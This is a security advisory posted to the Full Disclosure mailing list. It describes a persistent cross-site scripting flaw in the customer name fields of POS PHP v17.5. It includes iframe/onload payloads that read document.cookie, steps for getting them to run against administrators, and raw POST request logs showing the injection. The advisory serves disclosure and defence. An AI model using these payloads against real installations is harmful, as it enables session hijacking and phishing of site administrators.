
Date: Tue, 28 Apr 2020 10:55:12 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] POS PHP v17.5 - Persistent Cross Site Web Vulnerability

Document Title:
===============
POS PHP v17.5 - Persistent Cross Site Web Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2228


Release Date:
=============
2020-04-28


Vulnerability Laboratory ID (VL-ID):
====================================
2228


Common Vulnerability Scoring System:
====================================
4.6


Vulnerability Class:
====================
Cross Site Scripting - Persistent


Current Estimated Price:
========================
1.000€ - 2.000€


Product & Service Introduction:
===============================
Turn your Retail Small Business into a Customer Focused, Profit
Generating Machine. Guaranteed to save you time,
increase the accuracy of your inventory, and help you make informed
decisions for your business. Types of businesses
that work great with PHP Point of Sale.

(Copy of the Homepage: https://phppointofsale.com/ )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a persistent
cross site scripting web vulnerability in the POS PHP v17.5 web-application.


Vulnerability Disclosure Timeline:
==================================
2020-04-28: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Authentication Type:
====================
Restricted authentication (user/moderator) - User privileges


User Interaction:
=================
Low User Interaction


Disclosure Type:
================
Independent Security Research


Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in
the official POS PHP v17.5 web-application.
The vulnerability allows remote attackers to inject own malicious script
codes with persistent attack vector to
compromise browser to web-application requests from the application-side.

The persistent web vulnerability is located in the firstname and
lastname parameter of the customer profile module.
Remote attackers are able to change or add malicious script code as
firstname and lastname to customer profiles.
Thus allows to execute the script code with persistent attack vector
against administrators in the backend in the
/customers/ or customers/save/ modules. The request method to inject is
POST via add or edit of the customer and
the attack vector is located on the application-side.

Successful exploitation of the vulnerability results in session
hijacking, persistent phishing attacks, persistent
external redirects to malicious source and persistent manipulation of
affected application modules.

Request Method(s):
[+] POST

Vulnerable Module(s):
[+] Customer (index.php/customers/save)

Vulnerable Input(s):
[+] Firstname
[+] Lastname

Vulnerable File(s):
[+]

Vulnerable Parameter(s):
[+] firstname
[+] lastname

Affected Module(s):
[+] index.php/customers/


Proof of Concept (PoC):
=======================
The persistent input validation web vulnerability can be exploited by
remote attackers with low privilege user account with low user interaction.
For security demonstration or to reproduce the security web
vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce ...
1. Register a customer account
2. Move to the profile section
3. Inject test payload into the vulnerable firstname and lastname input
field
4. Save the entry and wait
Note: The execute occurs in the backend on preview of barcode, customer
details and more
5. Wait until the admin or other high privileged user roles are
interacting for execute
6. Successful reproduce of the persistent web vulnerability!


PoC: Exploitation
<iframe src="evil.source" onload="alert(document.domain)">
<iframe src="evil.source" onload="alert(document.cookie)">


PoC: Vulnerable Source
Reports - PHP Point Of Sale, Inc "<iframe src="evil.source"
onload="alert(document.cookie)"> >"<iframe src=evil.source
onload=alert(document.cookie)>
Report<small class="reports-range">04/25/2019-04/25/2020</small>
<button class="btn btn-primary text-white hidden-print print_button
pull-right"> Print </button>	
<button class="btn btn-primary text-white hidden-print
save_report_button pull-right" data-message="Enter report name"> Add to
Favorites</button>


--- PoC Session Logs [POST] ---
https://pos-php.localhost:8000/index.php/customers/check_duplicate
Host: pos-php.localhost:8000
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 156
Origin: https://pos-php.localhost:8000
Connection: keep-alive
Referer: https://pos-php.localhost:8000/index.php/customers/view/-1/
Cookie: phppos=c8cophf1djsrvoidg1hm8kmfo770ts3u
name=>"<iframe src=evil.source onload=alert(document.cookie)> >"<iframe
src=evil.source
onload=alert(document.cookie)>&email=test@...t.de&phone_number=1337
-
POST: HTTP/2.0 200 OK
content-type: text/html; charset=UTF-8
content-length: 19
server: Apache
cache-control: no-store, no-cache, must-revalidate
set-cookie: phppos=c8cophf1djsrvoidg1hm8kmfo770ts3u; path=/; HttpOnly
-
https://pos-php.localhost:8000/index.php/customers/save/
Host: pos-php.localhost:8000
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------229089197438477571343458328424
Content-Length: 5237
Origin: https://pos-php.localhost:8000
Connection: keep-alive
Referer: https://pos-php.localhost:8000/index.php/customers/view/-1/
Cookie: phppos=c8cophf1djsrvoidg1hm8kmfo770ts3u
first_name=>"<iframe src=evil.source
onload=alert(document.cookie)>&last_name=>"<iframe src=evil.source
onload=alert(document.cookie)>&email=test@....de&phone_number=&image_id=&address_1=&address_2=&city=&state=&zip=&country=&comments=&
internal_notes=&balance=0.00&credit_limit=1000.00&amount_to_spend_for_next_point=10.00&points=0.00&company_name=&
account_number=&tax_class=&tax_names[]=Sales Tax,Sales Tax
2,,,&tax_percents[]=,,,,&tax_cumulatives[]=0,0,0,0&taxable=1&
tax_certificate=&location_id=&files[]=,,,,&redirect_code=0
-
POST: HTTP/2.0 200 OK
content-type: text/html; charset=UTF-8
content-length: 155
server: Apache
cache-control: no-store, no-cache, must-revalidate
set-cookie: phppos=c8cophf1djsrvoidg1hm8kmfo770ts3u; path=/; HttpOnly
vary: Accept-Encoding
content-encoding: gzip
-
https://pos-php.localhost:8000/evil.source
Host: pos-php.localhost:8000
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive
Referer:
https://pos-php.localhost:8000/index.php/reports/generate/specific_customer?report_type=complex&
report_date_range_simple=CUSTOM&start_date=2019-04-25&start_date_formatted=04/25/2019%2012:00%20am&end_date=2020-04-
25%2023:59:59&end_date_formatted=04/25/2020%2012:00%20am&customer_id=42&sale_type=all&export_excel=0
Cookie: phppos=c8cophf1djsrvoidg1hm8kmfo770ts3u
-
GET: HTTP/2.0 200 OK
content-type: text/html; charset=iso-8859-1
content-length: 199
server: Apache




Credits & Authors:
==================
Vulnerability-Lab -
https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
Benjamin Kunz Mejri -
https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without
any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability
and capability for a particular purpose. Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct,
indirect, incidental, consequential loss of business profits
or special damages, even if Vulnerability-Lab or its suppliers have been
advised of the possibility of such damages. Some states do
not allow the exclusion or limitation of liability for consequential or
incidental damages so the foregoing limitation may not apply.
We do not approve or encourage anybody to break any licenses, policies,
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
www.vulnerability-db.com
Services:   magazine.vulnerability-lab.com
paste.vulnerability-db.com 			infosec.vulnerability-db.com
Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php
vulnerability-lab.com/rss/rss_upcoming.php
vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php
vulnerability-lab.com/register.php
vulnerability-lab.com/list-of-bug-bounty-programs.php

Any modified copy or reproduction, including partially usages, of this
file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified
form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers.
All pictures, texts, advisories, source code, videos and other
information on this website is trademark of vulnerability-lab team & the
specific authors or managers. To record, list, modify, use or
edit our material contact (admin@ or research@) to get a ask permission.

				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
Security GmbH]™




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/